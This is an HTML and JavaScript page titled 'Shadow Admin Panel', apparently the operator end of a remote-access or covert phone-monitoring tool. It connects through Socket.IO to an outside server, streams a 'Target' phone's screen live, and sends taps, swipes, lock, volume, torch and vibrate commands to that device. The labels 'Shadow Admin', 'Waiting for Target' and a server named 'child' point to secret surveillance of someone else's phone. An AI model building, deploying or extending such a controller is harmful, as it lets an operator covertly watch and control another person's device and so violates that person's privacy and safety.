<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Shadow Admin Panel - Fixed</title>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>

    <style>
        :root {
            --bg-color: #050505;
            --panel-bg: #1a1a1a;
            --accent: #00ff88;
            --danger: #ff3333;
            --text-main: #ffffff;
        }

        body {
            margin: 0; background-color: var(--bg-color); color: var(--text-main);
            font-family: 'Segoe UI', sans-serif; height: 100vh; display: flex; flex-direction: column; overflow: hidden;
        }

        /* --- Header --- */
        .top-nav {
            padding: 15px 20px; background: var(--panel-bg); border-bottom: 1px solid #333;
            display: flex; justify-content: space-between; align-items: center; z-index: 100;
        }
        .brand { font-size: 1.2rem; font-weight: bold; color: var(--accent); letter-spacing: 1px; }
        .status-badge { font-size: 0.9rem; display: flex; align-items: center; gap: 8px; }
        .live-dot { height: 10px; width: 10px; background-color: var(--danger); border-radius: 50%; }
        .live-dot.active { background-color: var(--accent); box-shadow: 0 0 8px var(--accent); animation: blink 1s infinite; }
        @keyframes blink { 50% { opacity: 0.5; } }

        /* --- Main Layout --- */
        .screen-container {
            flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; position: relative;
        }

        /* --- Phone Frame --- */
        .phone-frame {
            width: 320px; height: 620px; border: 12px solid #222; border-radius: 40px;
            background: #000; position: relative; box-shadow: 0 0 50px rgba(0,0,0,0.8);
            overflow: hidden; display: flex; align-items: center; justify-content: center;
        }
        #screenStream { width: 100%; height: 100%; object-fit: contain; display: none; background: #000; }
        .offline-msg { position: absolute; color: #666; text-align: center; }

        /* --- Taskbar/GUI Fix: Buttons laptop par ab nahi chupenge --- */
        .side-panel {
            position: absolute; right: 20px; top: 50%; transform: translateY(-50%);
            display: flex; flex-direction: column; gap: 12px;
            background: rgba(26, 26, 26, 0.9); padding: 15px; border-radius: 20px; border: 1px solid #333;
            max-height: 85vh; /* Laptop screen ke bahar nahi jayega */
            overflow-y: auto;  /* Agar buttons zyada hain to scroll hoga */
            scrollbar-width: none; /* Firefox ke liye scrollbar chupao */
        }
        .side-panel::-webkit-scrollbar { display: none; } /* Chrome ke liye scrollbar chupao */

        .control-btn {
            width: 50px; height: 50px; border-radius: 50%; background: #2a2a2a; border: 1px solid #444;
            color: white; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.2s; font-size: 1.2rem;
        }
        .control-btn:hover { border-color: var(--accent); color: var(--accent); transform: scale(1.1); }

        /* --- Navigation Bar inside Phone --- */
        .nav-bar {
            width: 100%; height: 50px; background: rgba(0, 0, 0, 0.9);
            position: absolute; bottom: 0; display: flex; justify-content: space-around; align-items: center; border-top: 1px solid #222;
        }
        .nav-item { color: #888; font-size: 1.3rem; cursor: pointer; padding: 10px; }

        /* --- Mobile Responsive --- */
        @media (max-width: 768px) {
            .side-panel {
                position: fixed; top: auto; bottom: 70px; right: 10px;
                flex-direction: row; flex-wrap: wrap; width: 100px; /* Mobile par stack honge */
                justify-content: center; transform: none; background: transparent; border: none;
            }
            .phone-frame { width: 280px; height: 560px; }
        }
    </style>
</head>
<body>

    <div class="top-nav">
        <div class="brand"><i class="fa-solid fa-ghost"></i> SHADOW ADMIN</div>
        <div class="status-badge">
            <div class="live-dot" id="dot"></div>
            <span id="statusText" style="color:#888">Connecting...</span>
        </div>
    </div>

    <div class="screen-container">
        <div class="phone-frame">
            <div id="offlineMsg" class="offline-msg">
                <i class="fa-solid fa-satellite-dish fa-spin fa-3x" style="color: var(--accent);"></i>
                <p id="msgText" style="margin-top:15px">Waiting for Target...</p>
            </div>
            
            <img id="screenStream" src="" alt="Live Stream" onclick="sendClick(event)">
            
            <div class="nav-bar">
                <div class="nav-item" onclick="sendCommand('recent')"><i class="fa-regular fa-square"></i></div>
                <div class="nav-item" onclick="sendCommand('home')"><i class="fa-regular fa-circle"></i></div>
                <div class="nav-item" onclick="sendCommand('back')"><i class="fa-solid fa-caret-left"></i></div>
            </div>
        </div>

        <div class="side-panel">
            <div class="control-btn" onclick="sendCommand('lock')" title="Lock"><i class="fa-solid fa-lock"></i></div>
            <div class="control-btn" onclick="sendCommand('volume_up')" title="Vol +"><i class="fa-solid fa-plus"></i></div>
            <div class="control-btn" onclick="sendCommand('volume_down')" title="Vol -"><i class="fa-solid fa-minus"></i></div>
            <div class="control-btn" onclick="sendCommand('swipe_up')" title="Up"><i class="fa-solid fa-arrow-up"></i></div>
            <div class="control-btn" onclick="sendCommand('swipe_down')" title="Down"><i class="fa-solid fa-arrow-down"></i></div>
            <div class="control-btn" onclick="sendCommand('torch')" title="Flashlight"><i class="fa-solid fa-lightbulb"></i></div>
            <div class="control-btn" onclick="sendCommand('vibrate')" title="Vibrate"><i class="fa-solid fa-mobile-vibration"></i></div>
        </div>
    </div>

    <script>
        const SERVER_URL = "https://child-v9no.onrender.com"; 
        let socket = null;
        let currentDeviceId = null;

        const streamImg = document.getElementById('screenStream');
        const offlineBox = document.getElementById('offlineMsg');
        const statusTxt = document.getElementById('statusText');
        const dot = document.getElementById('dot');

        window.addEventListener('load', () => {
            const params = new URLSearchParams(window.location.search);
            currentDeviceId = params.get('id');

            if (currentDeviceId) {
                initSocket();
            } else {
                statusTxt.innerText = "Error: ID Missing";
            }
        });

        function initSocket() {
            socket = io(SERVER_URL, { transports: ['websocket'] });

            socket.on("connect", () => {
                statusTxt.innerText = "Target: " + currentDeviceId;
                statusTxt.style.color = "var(--accent)";
                dot.classList.add("active");
                socket.emit("join-web", currentDeviceId); 
            });

            // ðŸ”¥ PHOTO LOGIC: Dono events check honge
            const handleFrame = (data) => {
                const frameData = data.frame || data.image; // Dono names handle honge
                if (frameData) {
                    offlineBox.style.display = "none";
                    streamImg.style.display = "block";
                    streamImg.src = "data:image/jpeg;base64," + frameData;
                }
            };

            socket.on("display-frame", handleFrame);
            socket.on("screen-data", handleFrame);

            socket.on("disconnect", () => {
                dot.classList.remove("active");
                statusTxt.innerText = "Offline";
                offlineBox.style.display = "flex";
                streamImg.style.display = "none";
            });
        }

        function sendCommand(action) {
            if(!socket || !socket.connected) return;
            socket.emit("admin-command", { device_id: currentDeviceId, command: action });
        }

        function sendClick(event) {
            const rect = streamImg.getBoundingClientRect();
            const x = Math.round(((event.clientX - rect.left) / rect.width) * 1000);
            const y = Math.round(((event.clientY - rect.top) / rect.height) * 1000);
            socket.emit("admin-command", { device_id: currentDeviceId, command: "CLICK", x: x, y: y });
        }
    </script>
</body>
</html>
